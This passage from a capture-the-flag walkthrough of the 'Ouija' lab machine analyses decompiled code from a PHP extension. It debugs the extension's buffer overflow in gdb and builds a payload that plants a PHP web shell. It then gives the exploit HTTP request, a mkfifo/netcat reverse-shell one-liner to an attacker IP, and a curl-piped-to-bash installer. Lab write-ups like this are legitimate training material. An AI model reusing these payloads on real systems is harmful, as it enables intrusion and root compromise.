  uStack_5f4._3_1_ = 's';
  uStack_5f0._0_1_ = 'i';
  uStack_5f0._1_1_ = 'o';
  uStack_5f0._2_1_ = 'n';
  uStack_5f0._3_1_ = '=';
  uStack_5ec._0_1_ = 'b';
  uStack_5ec._1_1_ = 'e';
  uStack_5ec._2_1_ = 't';
  uStack_5ec._3_1_ = 'a';
  *(undefined4 *)puVar7 = 0;
  local_5e8._0_1_ = ':';
  local_5e8._1_1_ = 't';
  local_5e8._2_1_ = 'y';
  local_5e8._3_1_ = 'p';
  local_5e8._4_1_ = 'e';
  local_5e8._5_1_ = '=';
  local_5e8._6_1_ = 't';
  local_5e8._7_1_ = 'e';
  uStack_5e0._0_1_ = 's';
  uStack_5e0._1_1_ = 't';
  uStack_5e0._2_1_ = 'i';
  uStack_5e0._3_1_ = 'n';
  uStack_5e0._4_1_ = 'g';
  uStack_5e0._5_1_ = '\0';
  uStack_5e0._6_1_ = '\0';
  uStack_5e0._7_1_ = '\0';
  if (800 < sVar2) {
    puVar7 = puVar6;
    for (lVar3 = 100; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar7 = *param_1;
      param_1 = param_1 + (ulong)bVar8 * -2 + 1;
      puVar7 = puVar7 + (ulong)bVar8 * -2 + 1;
    }
    goto LAB_0010193e;
  }
  uVar4 = sVar2 + 1;
  puVar7 = puVar6;
  if ((uint)uVar4 < 8) {
    if ((uVar4 & 4) == 0) goto LAB_001019d3;
LAB_00101a10:
    *(undefined4 *)puVar7 = *(undefined4 *)param_1;
    lVar3 = 4;
  }
  else {
    for (uVar5 = uVar4 >> 3 & 0x1fffffff; uVar5 != 0; uVar5 = uVar5 - 1) {
      *puVar7 = *param_1;
      param_1 = param_1 + (ulong)bVar8 * -2 + 1;
      puVar7 = puVar7 + (ulong)bVar8 * -2 + 1;
    }
    if ((uVar4 & 4) != 0) goto LAB_00101a10;
LAB_001019d3:
    lVar3 = 0;
  }
  if ((uVar4 & 2) != 0) {
    *(undefined2 *)((long)puVar7 + lVar3) = *(undefined2 *)((long)param_1 + lVar3);
    lVar3 = lVar3 + 2;
  }
  if ((uVar4 & 1) != 0) {
    *(undefined *)((long)puVar7 + lVar3) = *(undefined *)((long)param_1 + lVar3);
  }
LAB_0010193e:
  puVar7 = (undefined8 *)((long)&local_678 + lVar1 + 8);
  *(undefined8 *)((long)&local_678 + lVar1) = auStack_360[3];
  lVar3 = (long)&local_678 + (lVar1 - (long)puVar7);
  *(undefined8 *)((long)auStack_360 + lVar1) = local_30;
  puVar6 = (undefined8 *)((long)puVar6 - lVar3);
  for (uVar4 = (ulong)((int)lVar3 + 800U >> 3); uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + (ulong)bVar8 * -2 + 1;
    puVar7 = puVar7 + (ulong)bVar8 * -2 + 1;
  }
  *(undefined8 *)((long)&uStack_680 + lVar1) = 0x101996;
  printf("",&local_608,&local_678);
  *(undefined8 *)((long)&uStack_680 + lVar1) = 0x1019a1;
  event_recorder(&local_678,&local_608);
  *(undefined8 *)((long)&uStack_680 + lVar1) = 0x1019ac;
  load_users((long)&local_678 + lVar1,param_2);
  return;
}
```

We can see in the code below that there are no memory protections in place. This could hint at a potential integer overflow which might result into a buffer overflow.

```c
void event_recorder(char *param_1,char *param_2)

{
  long lVar1;
  int iVar2;
  FILE *pFVar3;
  size_t __size;
  undefined8 uStack_30;
  char acStack_28 [8];

  if (param_1 != (char *)0x0) {
    if (param_2 != (char *)0x0) {
      uStack_30 = 0x10141d;
      iVar2 = get_clean_size();
      lVar1 = -((long)iVar2 + 0xfU & 0xfffffffffffffff0);
      *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x101435;
      iVar2 = get_clean_size(param_1);
      *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x101443;
      memcpy(acStack_28 + lVar1,param_1,(long)iVar2);
      *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x10144b;
      iVar2 = get_clean_size(param_1);
      acStack_28[iVar2 + lVar1] = '\0';
      *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x101460;
      pFVar3 = fopen(acStack_28 + lVar1,"a");
      if (pFVar3 != (FILE *)0x0) {
        *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x101470;
        __size = strlen(param_2);
        *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x101483;
        fwrite(param_2,__size,1,pFVar3);
        *(undefined8 *)(acStack_28 + lVar1 + -8) = 0x10148b;
        fclose(pFVar3);
      }
      return;
    }
    if (param_1 != (char *)0x0) {
      uStack_30 = 0x1013e6;
      pFVar3 = fopen(param_1,"a");
      goto joined_r0x001014bc;
    }
  }
  uStack_30 = 0x1014b6;
  pFVar3 = fopen(l,"a");
joined_r0x001014bc:
  if (pFVar3 != (FILE *)0x0) {
    uStack_30 = 0x101402;
    fprintf(pFVar3,e);
    uStack_30 = 0x10140a;
    fclose(pFVar3);
  }
  return;
}
```

The best way to test this out is to run this library ourselves with a debugger to see if we can consistantly crash this service in a way that makes it possible for us to exploit it. First setup the environment with the following commands.

```
sudo apt install gdb
sudo cp lverifier.so /usr/lib/php/20220829
sudo chmod +x /usr/lib/php/20220829/lverifier.so

```

Modify the **/etc/php/8.2/mods-available/lverifier.ini** file and add the following line:

```
extention=lverifier.so
```

Next modify your php.ini and turn the **enable_dl** to **on**.

```
#Modify php.ini and enable dl
 enable_dl = On
#Install gef
 bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

If everything was installed properly you can now start debugging the php script by first openening up **gdb**.

```
sudo gdb php
```

Then execute the following script where we first load up the library. Next we setup our `u` variable with a value that is for sure going to overflow the bufer. Next we execute it. After executing it we could see in our **gbd** window that we were able to overflow the buffer.

```
dl('lverifier.so');
$u = str_repeat('A', 4096000);
$x = say_lverifier($u, 'world');
```

![Buffers overflown](/assets/img/Ouija/Ouija_20.png)

The next step is to create a list of characters where we can more easily figure out where the buffer overflowing starts and ends. I did this using the msf-create-pattern command. This will put a large set of strings into our file which we can test against the buffer.

```bash
msf-pattern_create -l 65538 > test.txt
```

Next we first set a breakpoint on this function in gdb using the following command:

```
b event_recorder
```

Afterwards we load the contents of this pattern file into our `u` variable and run the same function again:

```
php > dl('lverifier.so');
php > $u= file_get_contents("/home/kali/share/Share/HTB/Boxes/ouija/API/test.txt");
php > $x = say_lverifier($u, 'world');
```

This would then cause the following values being written to the variable of the **event_recorder**:

![Controlled overflow](/assets/img/Ouija/Ouija_21.png)

The first parameter **P** was for the path and got the value:

```
a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```

Then the second parameter **W** got the following value:

```
2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```

When we cross reference these values we can pinpoint exactly how much many bytes need to be offset for both values:

**P**

- Starts after byte 16
- Ends at byte 800

**W**

- Starts after byte 128
- Ends at byte 800

Seeing this, it means that there is some overlap we need to be careful with our payload. First of all I want to try to write just a file. Knowing that the end of the buffer is used as the path, I generated 794 characters **/** to prepend.

```bash
len=794 ch='/'
printf '%*s' "$len" | tr ' ' "$ch"
```

This list of characters will get prepended to **calico** then after that I add a huge amount of the letter **A** to create the integer overflow.

```
$u =  '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////calico'.str_repeat('A',64738);
```

Then after putting that value in, we repeated the loading request and we would see the following breakpoint:

```
say_lverifier($u, 'world');
```

![Controlled file creation](/assets/img/Ouija/Ouija_22.png)

Great! We can now write files. Now lets mimic our target by setting up the exact same file structure to where we want to write.

```
sudo mkdir development
sudo mkdir development/server-management_system_id_0
```

Now we have the right folder structure we just need to figure out the right format to get a payload going as well as writing this file to the right place. As a payload I'll utilize a simple php web shell.

```
<?=`$_GET[0]`?>
```

Then we need to write this to the following directories. We do this because then the payload actually works as a directory as well.

```
mkdir  /tmp/.hidden
mkdir '/tmp/.hidden/<?=`$_GET[0]`?>'
```

The payload we will be using in our buffer overflow is like the following:

```
/tmp/.hidden/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/calico.php
```

Now that we have our payload we need to calculate our slashes we want to prepend to this command. This can be calculated by doing 800 - length of the payload. Which in our case is 800 - 91 characters. This means we need 709 slashes before our payload. We can generate that with the following command

```bash
len=709 ch='/'
printf '%*s' "$len" | tr ' ' "$ch"
```

At the end we append 65000 AA's to trigger our integer overflow. our payload will look something like this. The AA's have been mostly removed from the write up for brevity.

```
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////tmp/.hidden/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/calico.phpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <SNIPPED>
```

We can exploit this by sending the following request. Again for brevity's sake I removed most of the AA's.

```
POST /index.php HTTP/1.1
Host: localhost:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 65823
Origin: http://localhost:9999
Connection: close
Referer: http://localhost:9999/
Upgrade-Insecure-Requests: 1

username=//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////tmp/.hidden/<?=`$_GET[0]`?>/../../..//development/server-management_system_id_0/calico.phpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<SNIPPED>&password=test
```

After sending this request our file would be uploaded into the root of this webserver. Then using the following curl command I was able to request the user running the service.

```bash
proxychains curl http://127.0.0.1:9999/calico.php?0=id
```

![Remote code execution](/assets/img/Ouija/Ouija_23.png)

Great, we have code execution as root but lets make it into a full reverse shell. Set up your listener like so:

```sh
nc -lnvp 443
```

Then I used the following payload to get a reverse shell. This payload still needs to be encoded before we can use it in a url.

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.216 443 >/tmp/f
```

When we send the following curl request with our url encoded payload we shortly after gain a reverse shell.

```sh
proxychains curl "http://127.0.0.1:9999/calico.php?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.216%20443%20%3E%2Ftmp%2Ff"
```

![Root shell](/assets/img/Ouija/Ouija_24.png)

## Appendices

### **app.js**

```js
var express = require("express");
var app = express();
var crt = require("crypto");
var b85 = require("base85");
var fs = require("fs");
const key = process.env.k;

app.listen(3000, () => {
  console.log("listening @ 3000");
});

function d(b) {
  s1 = Buffer.from(b, "base64").toString("utf-8");
  s2 = Buffer.from(s1.toLowerCase(), "hex");
  return s2;
}
function generate_cookies(identification) {
  var sha256 = crt.createHash("sha256");
  wrap = sha256.update(key);
  wrap = sha256.update(identification);
  hash = sha256.digest("hex");
  return hash;
}
function verify_cookies(identification, rhash) {
  if (generate_cookies(d(identification)) === rhash) {
    return 0;
  } else {
    return 1;
  }
}
function ensure_auth(q, r) {
  if (!q.headers["ihash"]) {
    r.json("ihash header is missing");
  } else if (!q.headers["identification"]) {
    r.json("identification header is missing");
  }

  if (verify_cookies(q.headers["identification"], q.headers["ihash"]) != 0) {
    r.json("Invalid Token");
  } else if (!d(q.headers["identification"]).includes("::admin:True")) {
    r.json("Insufficient Privileges");
  }
}

app.get("/login", (q, r, n) => {
  if (!q.query.uname || !q.query.upass) {
    r.json({ message: "uname and upass are required" });
  } else {
    if (!q.query.uname || !q.query.upass) {
      r.json({ message: "uname && upass are required" });
    } else {
      r.json({ message: "disabled (under dev)" });
    }
  }
});
app.get("/register", (q, r, n) => {
  r.json({ message: "__disabled__" });
});
app.get("/users", (q, r, n) => {
  ensure_auth(q, r);
  r.json({ message: "Database unavailable" });
});
app.get("/file/get", (q, r, n) => {
  ensure_auth(q, r);
  if (!q.query.file) {
    r.json({ message: "?file= i required" });
  } else {
    let file = q.query.file;
    if (file.startsWith("/") || file.includes("..") || file.includes("../")) {
      r.json({ message: "Action not allowed" });
    } else {
      fs.readFile(file, "utf8", (e, d) => {
        if (e) {
          r.json({ message: e });
        } else {
          r.json({ message: d });
        }
      });
    }
  }
});
app.get("/file/upload", (q, r, n) => {
  r.json({ message: "Disabled for security reasons" });
});
app.get("/*", (q, r, n) => {
  r.json("200 not found , redirect to .");
});
```

### **init.sh**

```sh
echo "$(date) api config starts" >>
mkdir -p .config/bin .config/local .config/share /var/log/zapi
export k=$(cat /opt/auth/api.key)
export botauth_id="bot1:bot"
export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"
ln -s /proc .config/bin/process_informations
echo "$(date) api config done" >> /var/log/zapi/api.log

exit 1
```
